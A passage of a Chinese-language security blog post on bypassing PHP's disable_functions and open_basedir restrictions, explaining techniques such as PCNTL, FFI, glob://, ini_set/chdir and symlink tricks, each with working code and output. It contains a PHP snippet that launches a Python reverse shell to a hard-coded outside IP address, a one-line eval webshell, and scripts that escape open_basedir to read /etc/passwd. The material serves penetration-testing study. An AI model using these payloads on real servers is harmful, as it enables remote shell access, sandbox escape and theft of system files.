+<h4 id="蚁剑插件–HP7-GC-with-Certain-Destructors-UAF"><a href="#蚁剑插件–HP7-GC-with-Certain-Destructors-UAF" class="headerlink" title="蚁剑插件–HP7 GC with Certain Destructors UAF"></a>蚁剑插件–HP7 GC with Certain Destructors UAF</h4><h5 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h5><p>影响范围是linux，php 7.1-7.3</p>
+<p>php7-gc-bypass漏洞利用PHP garbage collector程序中的堆溢出触发进而执行命令。</p>
+<h4 id="蚁剑插件–FFI-Bypass"><a href="#蚁剑插件–FFI-Bypass" class="headerlink" title="蚁剑插件–FFI Bypass"></a>蚁剑插件–FFI Bypass</h4><p>FFI（Foreign Function Interface）是 PHP7.4 新加入的功能，即外部函数接口，允许从共享库中调用C代码，利用ffi来引入libc中的system函数执行命令。</p>
+<h4 id="PCNTL-Bypass"><a href="#PCNTL-Bypass" class="headerlink" title="PCNTL Bypass"></a>PCNTL Bypass</h4><p>当php安装并使用pcntl扩展时，可借助其pcntlexec()函数直接执行命令来尝试绕过disablefunctions，pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP 4 &gt;= 4.2.0, PHP 5。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  pcntl_exec(<span class="string">&quot;/usr/bin/python&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;132.232.75.90&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="EXIM-Bypass"><a href="#EXIM-Bypass" class="headerlink" title="EXIM Bypass"></a>EXIM Bypass</h4><p>mail()函数的第五个additional_parameters参数可用于设置命令行选项传递给配置为发送邮件时使用的程序。</p>
+<h2 id="open-basedir代码绕过总结"><a href="#open-basedir代码绕过总结" class="headerlink" title="open_basedir代码绕过总结"></a>open_basedir代码绕过总结</h2><h3 id="open-basedir作用"><a href="#open-basedir作用" class="headerlink" title="open_basedir作用"></a>open_basedir作用</h3><p>open_basedir是php.ini中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域，比如：该项配置为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir &#x3D; &#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;libs&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>表示用户可操作的文件只能限制在改目录之内，注意<code>/Applications/MAMP/htdocs/libs/</code>和<code>/Applications/MAMP/htdocs/libs</code>是不一样的作用，前者表示只能在目录libs中操作，后者表示libs、libs1等目录都可以操作。</p>
+<p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  php tree</span><br><span class="line">.</span><br><span class="line">├── 1.txt</span><br><span class="line">├── add.php</span><br><span class="line">├── addd.php</span><br><span class="line">├── conn.php</span><br><span class="line">├── coon.php</span><br><span class="line">├── delete.php</span><br><span class="line">├── deletee.php</span><br><span class="line">├── getcookie.php</span><br><span class="line">├── list.php</span><br><span class="line">├── listt.php</span><br><span class="line">└── setcookie.php</span><br><span class="line"></span><br><span class="line">0 directories, 11 files</span><br><span class="line">➜  php pwd</span><br><span class="line">&#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;php</span><br></pre></td></tr></table></figure>
+
+<p>相关配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir &#x3D; &#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;libs&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>list.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  php cat list.php</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;display_errors&#39;,1);</span><br><span class="line">$file&#x3D;file_get_contents(&#39;.&#x2F;1.txt&#39;);</span><br><span class="line">echo $file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;php&#x2F;list.php</span><br></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No input file specified.</span><br></pre></td></tr></table></figure>
+
+<p>修改配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir &#x3D; &#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;php&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;php&#x2F;list.php</span><br></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">good hacker</span><br></pre></td></tr></table></figure>
+
+<p>同样我们访问其他目录的文件也是不可以的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;conn.php</span><br></pre></td></tr></table></figure>
+
+<p>在渗透测试中经常回去使用一句话木马执行命令进而对文件目录进行操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_GET[&#39;shell&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当前配置为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir &#x3D; &#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;php&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;php&#x2F;list.php?shell&#x3D;var_dump(scandir(%27.&#x2F;%27));</span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/Applications/MAMP/htdocs/php/<span class="keyword">list</span>.php(<span class="number">1</span>) : <span class="keyword">eval</span>()<span class="string">&#x27;d code:1:</span></span><br><span class="line"><span class="string">array (size=14)</span></span><br><span class="line"><span class="string">  0 =&gt; string &#x27;</span>.<span class="string">&#x27; (length=1)</span></span><br><span class="line"><span class="string">  1 =&gt; string &#x27;</span>..<span class="string">&#x27; (length=2)</span></span><br><span class="line"><span class="string">  2 =&gt; string &#x27;</span>.DS_Store<span class="string">&#x27; (length=9)</span></span><br><span class="line"><span class="string">  3 =&gt; string &#x27;</span><span class="number">1.</span>txt<span class="string">&#x27; (length=5)</span></span><br><span class="line"><span class="string">  4 =&gt; string &#x27;</span>add.php<span class="string">&#x27; (length=7)</span></span><br><span class="line"><span class="string">  5 =&gt; string &#x27;</span>addd.php<span class="string">&#x27; (length=8)</span></span><br><span class="line"><span class="string">  6 =&gt; string &#x27;</span>conn.php<span class="string">&#x27; (length=8)</span></span><br><span class="line"><span class="string">  7 =&gt; string &#x27;</span>coon.php<span class="string">&#x27; (length=8)</span></span><br><span class="line"><span class="string">  8 =&gt; string &#x27;</span>delete.php<span class="string">&#x27; (length=10)</span></span><br><span class="line"><span class="string">  9 =&gt; string &#x27;</span>deletee.php<span class="string">&#x27; (length=11)</span></span><br><span class="line"><span class="string">  10 =&gt; string &#x27;</span>getcookie.php<span class="string">&#x27; (length=13)</span></span><br><span class="line"><span class="string">  11 =&gt; string &#x27;</span><span class="keyword">list</span>.php<span class="string">&#x27; (length=8)</span></span><br><span class="line"><span class="string">  12 =&gt; string &#x27;</span>listt.php<span class="string">&#x27; (length=9)</span></span><br><span class="line"><span class="string">  13 =&gt; string &#x27;</span>setcookie.php<span class="string">&#x27; (length=13)</span></span><br></pre></td></tr></table></figure>
+
+<p>在当前目录操作其他目录，输出：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Applications/MAMP/htdocs/php/<span class="keyword">list</span>.php(<span class="number">1</span>) : <span class="keyword">eval</span>()<span class="string">&#x27;d code:1:boolean false</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h3><h4 id="通过系统命令执行绕过"><a href="#通过系统命令执行绕过" class="headerlink" title="通过系统命令执行绕过"></a>通过系统命令执行绕过</h4><p>在上面的例子中，可以看到<code>scandir</code>函数不能切换目录，可以尝试system函数进行执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;php&#x2F;list.php?shell&#x3D;system(&#39;cd ..&#x2F;..&#x2F;;ls);</span><br></pre></td></tr></table></figure>
+
+<p>但是在php位置文件中，经常会禁用<code>system</code>函数。</p>
+<h4 id="glob-伪协议"><a href="#glob-伪协议" class="headerlink" title="glob://伪协议"></a>glob://伪协议</h4><p>glob://协议是php5.3.0以后一种查找匹配的文件路径模式。使用方式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">$it = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///Applications/MAMP/htdocs/php/*.php&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    printf(<span class="string">&quot;%s: %.1FK\n&quot;</span>, $f-&gt;getFilename(), $f-&gt;getSize()/<span class="number">1024</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add.php: 2.3K</span><br><span class="line">addd.php: 2.4K</span><br><span class="line">conn.php: 0.7K</span><br><span class="line">coon.php: 0.2K</span><br><span class="line">delete.php: 0.4K</span><br><span class="line">deletee.php: 0.2K</span><br><span class="line">getcookie.php: 0.2K</span><br><span class="line">list.php: 0.2K</span><br><span class="line">listt.php: 1.7K</span><br><span class="line">setcookie.php: 0.1K</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">// normal files</span></span><br><span class="line">$it = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// special files (starting with a dot(.))</span></span><br><span class="line">$it = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///.*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">foreach</span>($file_list <span class="keyword">as</span> $f)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$f&#125;</span>&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">open_basedir : &#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;php&#x2F;</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">.DS_Store</span><br><span class="line">.VolumeIcon.icns</span><br><span class="line">.file</span><br><span class="line">.fseventsd</span><br><span class="line">.vol</span><br><span class="line">Applications</span><br><span class="line">Library</span><br><span class="line">System</span><br><span class="line">Users</span><br><span class="line">Volumes</span><br><span class="line">bin</span><br><span class="line">cores</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">opt</span><br><span class="line">private</span><br><span class="line">sbin</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
+
+<h5 id="scandir-glob"><a href="#scandir-glob" class="headerlink" title="scandir()+glob://"></a>scandir()+glob://</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(<span class="string">&#x27;glob:///*&#x27;</span>));</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="opendir-readdir-glob"><a href="#opendir-readdir-glob" class="headerlink" title="opendir()+readdir()+glob://"></a>opendir()+readdir()+glob://</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ( $b = opendir(<span class="string">&#x27;glob:///*&#x27;</span>) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( ($file = readdir($b)) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $file.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir($b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="ini-set设置"><a href="#ini-set设置" class="headerlink" title="ini_set设置"></a>ini_set设置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mkdir(&#39;test&#39;);  &#x2F;&#x2F;创建一个目录test</span><br><span class="line">chdir(&#39;Von&#39;);  &#x2F;&#x2F;切换到test目录下</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;..&#39;);  &#x2F;&#x2F;把open_basedir切换到上层目录</span><br><span class="line">chdir(&#39;..&#39;);  &#x2F;&#x2F;以下这三步是把目录切换到根目录</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">chdir(&#39;..&#39;);</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);  &#x2F;&#x2F;设置open_basedir为根目录(此时相当于没有设置open_basedir)</span><br><span class="line">echo file_get_contents(&#39;&#x2F;etc&#x2F;passwd&#39;);  &#x2F;&#x2F;读取&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p>php.ini的设置为<code>/var/html/www/html</code>。</p>
+<ul>
+<li><p>创建目录，然后进入<code>/var/html/www/html/test</code>目录</p>
+</li>
+<li><p>此时<code>open_basedir</code>值为<code>/var/html/www/html</code>，对其设置属性值，先判断当前<code>/var/www/html/test/..</code>是否在<code>open_basedir</code>中，即<code>/var/html/www/html</code>，存在则设置成功，此时<code>open_basedir</code>为<code>..</code>。</p>
+</li>
+<li><p>执行<code>chdir(&#39;..&#39;)</code>之前，检测当前执行目录即<code>/var/html/www/html/test/..</code>，即<code>/var/html/www/html/</code>是否在，<code>..</code>即<code>/var/html/www/html/</code>中。</p>
+</li>
+<li><p>后两步同理。</p>
+</li>
+</ul>
+<p>最后把<code>open_basedir</code>，设置成了根目录，可以实现对任意目录读取。</p>
+<h4 id="symlink-函数"><a href="#symlink-函数" class="headerlink" title="symlink()函数"></a>symlink()函数</h4><p>symlink()对于已有的target建立一个名为link的符号连接。<br>用法如下:</p>
+<ul>
+<li>symlink (string target,stringtarget,stringlink) symlink()对于已有的 target(一般情况下受限于open_basedir)建立一个名为link的符号连接。</li>
+<li>成功时返回TRUE， 或者在失败时返回FALSE。 示例用法如下:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &#39;uploads.php&#39;;</span><br><span class="line">$link &#x3D; &#39;uploads&#39;;</span><br><span class="line">symlink($target, $link);</span><br><span class="line"></span><br><span class="line">echo readlink($link);</span><br><span class="line"># 将会输出&#39;uploads.php&#39;这个字符串</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mkdir(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">symlink(<span class="string">&quot;a/b/c/d&quot;</span>,<span class="string">&quot;good&quot;</span>);</span><br><span class="line">symlink(<span class="string">&quot;good/../../../../etc/passwd&quot;</span>,<span class="string">&quot;exp&quot;</span>);</span><br><span class="line">unlink(<span class="string">&quot;good&quot;</span>);</span><br><span class="line">mkdir(<span class="string">&quot;good&quot;</span>);</span><br><span class="line">system(<span class="string">&#x27;cat exp&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>首先创建a/b/c/d目录,并把当前目录移动到该目录下面。</li>
+<li>接着symlink(“a/b/c/d”,”good”);创建了一个符号文件good,指向了a/b/c/d</li>
+<li>接着symlink(“good/../../../../etc/passwd”,”exp”),由于此时good仍然是一个符号文件,所以等价于symlink(“a/b/c/d/../../../../etc/passwd”,”exp”),由于此时a/b/c/d/../../../../的结果等于/var/www/html,符合open_basedir的限制,因此软链接可以被成功建立</li>
+<li>但是之后我们删除了good这个软链接，并且建立了一个真实的文件夹good,所以此时上面symlink(“good/../../../../etc/passwd”,”exp”)中的good不再是软链接而是一个真实的目录。从而达到跨目录访问的效果。 其实到了这一步，我们直接访问根目录下的exp文件能得到结果。</li>
+</ul>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text">PHP安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%90%8E%E9%97%A8"><span class="toc-number">1.1.</span> <span class="toc-text">PHP后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E9%85%8D%E7%BD%AE%E5%8F%AF%E8%A2%AB%E4%BF%AE%E6%94%B9%E7%9A%84%E8%AE%BE%E5%AE%9A%E8%8C%83%E5%9B%B4"><span class="toc-number">1.1.1.</span> <span class="toc-text">PHP配置可被修改的设定范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-ini"><span class="toc-number">1.1.2.</span> <span class="toc-text">php.ini</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#auto-prepend-file%E4%B8%8Eauto-append-file"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">auto_prepend_file与auto_append_file</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#include-path"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">include_path</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini"><span class="toc-number">1.1.3.</span> <span class="toc-text">.user.ini</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-1"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87disable-function"><span class="toc-number">1.2.</span> <span class="toc-text">绕过disable_function</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#disable-functions%E4%BD%9C%E7%94%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">disable_functions作用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84PHP%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">常规PHP文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">蚁剑</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#disable-functions%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">disable_functions绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#linux%E2%80%93%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E2%80%93LD-PRELOAD"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">linux–蚁剑插件–LD_PRELOAD</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.2.1.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%93%E5%90%88mail-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.1.2.</span> <span class="toc-text">结合mail 函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.2.1.3.</span> <span class="toc-text">蚁剑插件实现思路</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linux%E2%80%93%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E2%80%93Fastcgi-PHP-FPM"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">linux–蚁剑插件–Fastcgi&#x2F;PHP-FPM</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-2"><span class="toc-number">1.2.2.2.1.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0fast-cgi%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">1.2.2.2.1.1.</span> <span class="toc-text">伪造fast-cgi数据包</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8webshell%E6%94%BB%E5%87%BBPHP-FPM%E2%80%93%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6"><span class="toc-number">1.2.2.2.1.2.</span> <span class="toc-text">使用webshell攻击PHP-FPM–蚁剑插件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#win-%E7%B3%BB%E7%BB%9F%E7%BB%84%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">win-系统组件绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ImageMagick%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">ImageMagick漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E2%80%93Apache-Mod-CGI"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">蚁剑插件–Apache Mod CGI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">1.2.2.5.1.</span> <span class="toc-text">利用条件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E2%80%93Json-Serializer-UAF"><span 